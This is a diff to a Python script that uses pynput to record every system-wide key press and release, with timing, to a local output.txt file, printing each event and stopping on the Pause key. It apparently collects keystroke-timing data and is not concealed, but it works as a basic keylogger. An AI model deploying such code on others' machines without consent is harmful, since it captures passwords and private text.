@@ -11,7 +11,7 @@ import threading
 import wave
 import string
 from pynput import keyboard
-from pynput.keyboard import Listener
+from pynput.keyboard import Listener, Key
 import time
 import glob
 import functools
@@ -62,9 +62,10 @@ def get_current_time_ms():
 class Main:
     def __init__(self):
         self.last_event_time_ms = get_current_time_ms()
+        self.f = open("output.txt", "a")
 
     def appendlog(self, string):
-        self.log = self.log + string
+        self.f.write(string + "\n")
 
     def key_press(self, key):
         try:
@@ -76,8 +77,6 @@ class Main:
                 current_key = "ESC"
             else:
                 current_key = str(key)
-
-        self.appendlog(current_key)
         actual_key = None
         if type(key).__name__ == 'KeyCode':
             actual_key = control_char_to_key.get(repr(key.char), None)
@@ -89,6 +88,7 @@ class Main:
         
         current_time = get_current_time_ms()
         print(f"Press,{actual_key},{current_time - self.last_event_time_ms}")
+        self.appendlog(f"Press,{actual_key},{current_time - self.last_event_time_ms}")
         self.last_event_time_ms = current_time
     
     def key_release(self, key):
@@ -102,7 +102,6 @@ class Main:
             else:
                 current_key = str(key)
 
-        self.appendlog(current_key)
         actual_key = None
         if type(key).__name__ == 'KeyCode':
             actual_key = control_char_to_key.get(repr(key.char), None)
@@ -110,8 +109,14 @@ class Main:
         if not actual_key:
             actual_key = current_key
         
+        if key == Key.pause:
+            self.appendlog("======================================================")
+            self.f.close()
+            exit()
+        
         current_time = get_current_time_ms()
         print(f"Release,{actual_key},{current_time - self.last_event_time_ms}")
+        self.appendlog(f"Release,{actual_key},{current_time - self.last_event_time_ms}")
         self.last_event_time_ms = current_time
 
 
